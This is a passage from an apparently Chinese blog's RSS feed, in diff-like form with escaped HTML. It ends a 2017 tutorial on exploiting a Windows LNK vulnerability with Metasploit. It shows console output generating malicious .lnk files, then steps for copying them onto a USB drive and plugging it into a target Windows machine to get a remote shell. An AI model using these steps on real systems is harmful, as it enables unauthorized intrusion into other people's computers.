-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/FTLzXgWfeTeMuieN_Y.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Y
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/JKYOcCLPNuxnHvlh_Z.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Z
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;执行上述metasploit命令后会在本地启动好监听程序，&lt;strong&gt;并在~/.msf4/local中生成多个link文件&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/h2&gt;
-
-&lt;p&gt;在目录 &lt;strong&gt;~/.msf4/local&lt;/strong&gt; 将生成的所有 &lt;strong&gt;Link&lt;/strong&gt; 文件拷贝到U盘的根路径中&lt;/p&gt;
-
-&lt;h2 id=&quot;5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/h2&gt;
-
-&lt;p&gt;将U盘插入目标windows机器中，打开U盘就会出发远程link漏洞，在Metasploit控制台中得到目标主机的shell&lt;/p&gt;
-</description>  
-               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</guid>  
                </item>  
           
     </channel>  
